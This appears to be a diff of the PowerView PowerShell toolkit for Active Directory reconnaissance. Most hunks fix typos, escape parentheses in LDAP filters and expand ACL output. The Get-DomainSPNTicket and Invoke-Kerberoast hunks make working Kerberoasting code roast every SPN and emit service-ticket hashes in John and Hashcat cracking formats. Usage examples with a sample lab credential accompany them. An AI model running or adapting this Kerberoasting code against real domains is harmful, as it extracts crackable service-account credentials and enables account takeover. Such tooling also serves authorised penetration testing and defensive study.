@@ -1563,18 +1563,18 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
                     )
                 }
                 catch {
-                    Write-Verbose "[Convert-ADName] Error initialiting translation for '$Identity' using alternate credentials : $_"
+                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                 }
             }
             else {
                 try {
-                    Invoke-Method $Translate 'Init' (
+                    $Null = Invoke-Method $Translate 'Init' (
                         $ADSInitType,
                         $InitName
                     )
                 }
                 catch {
-                    Write-Verbose "[Convert-ADName] Error initialiting translation for '$Identity' : $_"
+                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                 }
             }
 
@@ -1583,7 +1583,7 @@ https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
 
             try {
                 # 8 = Unknown name type -> let the server do the work for us
-                Invoke-Method $Translate 'Set' (8, $TargetIdentity)
+                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                 Invoke-Method $Translate 'Get' ($ADSOutputType)
             }
             catch [System.Management.Automation.MethodInvocationException] {
@@ -2296,8 +2296,8 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
             }
             else {
                 $UserSPN = $Object
-                $SamAccountName = $Null
-                $DistinguishedName = $Null
+                $SamAccountName = 'UNKNOWN'
+                $DistinguishedName = 'UNKNOWN'
             }
 
             # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
@@ -2305,7 +2305,12 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $UserSPN = $UserSPN[0]
             }
 
-            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+            try {
+                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+            }
+            catch {
+                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
+            }
             if ($Ticket) {
                 $TicketByteStream = $Ticket.GetRequest()
             }
@@ -2322,16 +2327,22 @@ Outputs a custom object containing the SamAccountName, ServicePrincipalName, and
                 $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
 
                 if ($OutputFormat -match 'John') {
-                    $HashFormat = "`$krb5tgs`$unknown:$Hash"
+                    $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                 }
                 else {
+                    if ($DistinguishedName -ne 'UNKNOWN') {
+                        $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                    }
+                    else {
+                        $UserDomain = 'UNKNOWN'
+                    }
+
                     # hashcat output format
-                    $HashFormat = '$krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Service,OU=Accounts,OU=EnterpriseObjects,DC=asdsa,DC=pf,DC=fakedomain,DC=com SPN: E0518235-4B06-11D1-AB04-00C04FDS3CD2-BADM/aksjdb.asdsa.pf.fakedomain.com:50000 *' + $Hash
+                    $HashFormat = "`$krb5tgs`$23`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                 }
                 $Out | Add-Member Noteproperty 'Hash' $HashFormat
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                 Write-Output $Out
-                break
             }
         }
     }
@@ -2413,15 +2424,22 @@ for connection to the target domain.
 
 Invoke-Kerberoast | fl
 
+Kerberoasts all found SPNs for the current domain.
+
 .EXAMPLE
 
-Invoke-Kerberoast -Domain dev.testlab.local | fl
+Invoke-Kerberoast -Domain dev.testlab.local -OutputFormat HashCat | fl
+
+Kerberoasts all found SPNs for the testlab.local domain, outputting to HashCat
+format instead of John (the default).
 
 .EXAMPLE
 
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -orce
 $Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
-Invoke-Kerberoast -Credential $Cred -Verbose | fl
+Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl
+
+Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.
 
 .OUTPUTS
 
@@ -3656,7 +3674,7 @@ http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49
                 [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             }
             catch {
-                Write-Verbose "[Get-Domain] The specified domain does '$TargetDomain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
+                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
             }
         }
         elseif ($PSBoundParameters['Domain']) {
@@ -4699,21 +4717,24 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                         $UserSearcher = Get-DomainSearcher @SearcherArguments
                     }
                 }
-                elseif ($IdentityInstance -match '^S-1-.*') {
-                    # SID format
-                    $IdentityFilter += "(objectsid=$IdentityInstance)"
-                }
-                elseif ($IdentityInstance -match '^CN=.*') {
-                    # distinguished names
-                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
-                }
                 else {
-                    try {
-                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                        $IdentityFilter += "(objectguid=$GuidByteString)"
+                    $IdentityInstance = $IdentityInstance.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match '^S-1-.*') {
+                        # SID format
+                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                     }
-                    catch {
-                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
+                    elseif ($IdentityInstance -match '^CN=.*') {
+                        # distinguished names
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    }
+                    else {
+                        try {
+                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                            $IdentityFilter += "(objectguid=$GuidByteString)"
+                        }
+                        catch {
+                            $IdentityFilter += "(samAccountName=$IdentityInstance)"
+                        }
                     }
                 }
             }
@@ -4742,7 +4763,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
                 $Filter += '(msds-allowedtodelegateto=*)'
             }
-            if ($PSBoundParameters['KerberosPreauthNotRequireduthNotRequired']) {
+            if ($PSBoundParameters['KerberosPreauthNotRequired']) {
                 Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
                 $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
             }
@@ -5728,7 +5749,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                 if ($IdentityInstance -match '^S-1-.*') {
                     $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
@@ -5771,7 +5792,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
             if ($PSBoundParameters['SPN']) {
                 Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
-                $Filter += '(servicePrincipalName=$SPN)'
+                $Filter += "(servicePrincipalName=$SPN)"
             }
             if ($PSBoundParameters['OperatingSystem']) {
                 Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
@@ -6053,23 +6074,26 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                         $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                     }
                 }
-                elseif ($IdentityInstance -match '^S-1-.*') {
-                    $IdentityFilter += "(objectsid=$IdentityInstance)"
-                }
-                elseif ($IdentityInstance -match '^(CN|OU)=.*') {
-                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
-                }
                 else {
-                    try {
-                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                        $IdentityFilter += "(objectguid=$GuidByteString)"
+                    $IdentityInstance = $IdentityInstance.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match '^S-1-.*') {
+                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                     }
-                    catch {
-                        if ($IdentityInstance.Contains('.')) {
-                            $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
+                    elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
+                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    }
+                    else {
+                        try {
+                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                            $IdentityFilter += "(objectguid=$GuidByteString)"
                         }
-                        else {
-                            $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
+                        catch {
+                            if ($IdentityInstance.Contains('.')) {
+                                $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
+                            }
+                            else {
+                                $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
+                            }
                         }
                     }
                 }
@@ -6752,11 +6776,11 @@ Custom PSObject with ACL entries.
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                 if ($IdentityInstance -match '^S-1-.*') {
                     $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($IdentityInstance -match '^(CN|OU)=.*') {
+                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                 }
                 else {
@@ -6769,7 +6793,7 @@ Custom PSObject with ACL entries.
                             $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                         }
                         else {
-                            $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
+                            $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                         }
                     }
                 }
@@ -7380,11 +7404,26 @@ Custom PSObject with ACL entries.
                 if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                     if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                         $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]
-                        $_ | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
-                        $_ | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
-                        $_ | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
-                        $_ | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
-                        $_
+
+                        $InterestingACL = New-Object PSObject
+                        $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
+                        $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
+                        $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
+                        if ($_.ObjectAceType) {
+                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
+                        }
+                        else {
+                            $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
+                        }
+                        $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
+                        $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
+                        $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
+                        $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
+                        $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
+                        $InterestingACL
                     }
                     else {
                         $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
@@ -7397,7 +7436,7 @@ Custom PSObject with ACL entries.
                             $ObjectSearcherArguments['Identity'] = $IdentityReferenceDN
                             # "IdentityReferenceDN: $IdentityReferenceDN"
                             $Object = Get-DomainObject @ObjectSearcherArguments
-                            $ObjectSearcherArguments
+
                             if ($Object) {
                                 $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                 if ($Object.Properties.objectclass -match 'computer') {
@@ -7416,11 +7455,25 @@ Custom PSObject with ACL entries.
                                 # save so we don't look up more than once
                                 $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass
 
-                                $_ | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
-                                $_ | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
-                                $_ | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
-                                $_ | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
-                                $_
+                                $InterestingACL = New-Object PSObject
+                                $InterestingACL | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
+                                $InterestingACL | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
+                                $InterestingACL | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
+                                if ($_.ObjectAceType) {
+                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
+                                }
+                                else {
+                                    $InterestingACL | Add-Member NoteProperty 'ObjectAceType' 'None'
+                                }
+                                $InterestingACL | Add-Member NoteProperty 'AceFlags' $_.AceFlags
+                                $InterestingACL | Add-Member NoteProperty 'AceType' $_.AceType
+                                $InterestingACL | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
+                                $InterestingACL | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceName' $IdentityReferenceName
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDomain' $IdentityReferenceDomain
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceDN' $IdentityReferenceDN
+                                $InterestingACL | Add-Member NoteProperty 'IdentityReferenceClass' $IdentityReferenceClass
+                                $InterestingACL
                             }
                         }
                         else {
@@ -7641,7 +7694,7 @@ Custom PSObject with translated OU property fields.
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                 if ($IdentityInstance -match '^OU=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                 }
@@ -7900,7 +7953,7 @@ Custom PSObject with translated site property fields.
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                 if ($IdentityInstance -match '^CN=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                 }
@@ -8158,7 +8211,7 @@ Custom PSObject with translated subnet property fields.
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                 if ($IdentityInstance -match '^CN=.*') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                 }
@@ -8629,19 +8682,22 @@ Custom PSObject with translated group property fields.
                             $GroupSearcher = Get-DomainSearcher @SearcherArguments
                         }
                     }
-                    elseif ($IdentityInstance -match '^S-1-.*') {
-                        $IdentityFilter += "(objectsid=$IdentityInstance)"
-                    }
-                    elseif ($IdentityInstance -match '^CN=.*') {
-                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
-                    }
                     else {
-                        try {
-                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                            $IdentityFilter += "(objectguid=$GuidByteString)"
+                        $IdentityInstance = $IdentityInstance.Replace('(', '\28').Replace(')', '\29')
+                        if ($IdentityInstance -match '^S-1-.*') {
+                            $IdentityFilter += "(objectsid=$IdentityInstance)"
                         }
-                        catch {
-                            $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
+                        elseif ($IdentityInstance -match '^CN=.*') {
+                            $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                        }
+                        else {
+                            try {
+                                $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                                $IdentityFilter += "(objectguid=$GuidByteString)"
+                            }
+                            catch {
+                                $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance))"
+                            }
                         }
                     }
                 }
@@ -9350,19 +9406,22 @@ http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-
                             $GroupSearcher = Get-DomainSearcher @SearcherArguments
                         }
                     }
-                    elseif ($IdentityInstance -match '^S-1-.*') {
-                        $IdentityFilter += "(objectsid=$IdentityInstance)"
-                    }
-                    elseif ($IdentityInstance -match '^CN=.*') {
-                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
-                    }
                     else {
-                        try {
-                            $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
-                            $IdentityFilter += "(objectguid=$GuidByteString)"
+                        $IdentityInstance = $IdentityInstance.Replace('(', '\28').Replace(')', '\29')
+                        if ($IdentityInstance -match '^S-1-.*') {
+                            $IdentityFilter += "(objectsid=$IdentityInstance)"
                         }
-                        catch {
-                            $IdentityFilter += "(samAccountName=$IdentityInstance)"
+                        elseif ($IdentityInstance -match '^CN=.*') {
+                            $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                        }
+                        else {
+                            try {
+                                $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
+                                $IdentityFilter += "(objectguid=$GuidByteString)"
+                            }
+                            catch {
+                                $IdentityFilter += "(samAccountName=$IdentityInstance)"
+                            }
                         }
                     }
                 }
@@ -10907,11 +10966,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 $IdentityFilter = ''
                 $Filter = ''
                 $Identity | Where-Object {$_} | ForEach-Object {
-                    $IdentityInstance = $_
-                    if ($IdentityInstance -match 'LDAP://') {
-                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
-                    }
-                    elseif ($IdentityInstance -match '^CN=.*') {
+                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                    if ($IdentityInstance -match 'LDAP://|^CN=.*') {
                         $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     }
                     elseif ($IdentityInstance -match '{.*}') {
